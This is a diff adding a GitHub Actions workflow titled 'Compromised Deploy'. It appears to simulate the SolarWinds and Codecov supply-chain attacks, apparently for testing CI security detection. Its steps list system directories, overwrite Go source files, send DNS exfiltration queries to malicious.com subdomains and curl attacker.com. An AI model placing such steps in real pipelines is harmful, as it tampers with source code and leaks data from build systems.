@@ -1,0 +1,43 @@
+name: Compromised Deploy
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    name: Deploy
+    runs-on: ubuntu-latest
+    steps:
+      # Checkout code
+      - run: sleep 2
+      - name: Code Checkout
+        uses: actions/checkout@v2
+        with:
+          fetch-depth: 2
+      - run: sleep 2
+      - run: ls -lah /
+      - run: ls -lah /home
+      - run: pwd
+
+      # SolarWinds Scenario: Overwrite main.go and utility.go
+      - name: File Overwrite with mv
+        run: |
+          code='package main\n\nfunc main(){\nprintln("code added")\n}'
+          printf "$code" > main1.go
+          mv main1.go main.go
+      - run: sleep 2
+      - name: File Overwrite with echo
+        run: echo "//overwritten" > utilities.go
+
+      # DNS Data Exfiltration
+      - name: DNS Data Exfiltration
+        run: |
+          dig wI25mMRFgqmHdg6Se7F3qcRPg6mHxTXgoroAcQcu0ukreCZVj3ccl1OE4nhT.malicious.com
+          dig AjgjtZpoQFBk3CA9x2ic1OL4X6cSAbpPGscvTcxlZshd52cmJz6vYf4voTmo.malicious.com
+          dig uVqkyYsy48uC9q6oZEirkVK7sdHaSCx5v5BitwaBnTjKsjlRamhW6vP1pXNu.malicious.com
+          dig M6VzSkW4v7KPE0SILITZxLnrrBJiSxRYb0hUBiFJdIz2VpBJwkNOH3MEhesc.malicious.com
+          dig xd2rqUt1L0RN8IbthvNkOCyhR2FHneUESSM12Gq6ToNxFZkFY0W5KWUnxLtN.malicious.com
+
+      # Codecov Scenario: Exfiltrate data to a malicious endpoint
+      - name: Data Exfiltration To Attacker Controller Endpoint
+        run: curl attacker.com -L
+
+      - run: sleep 2
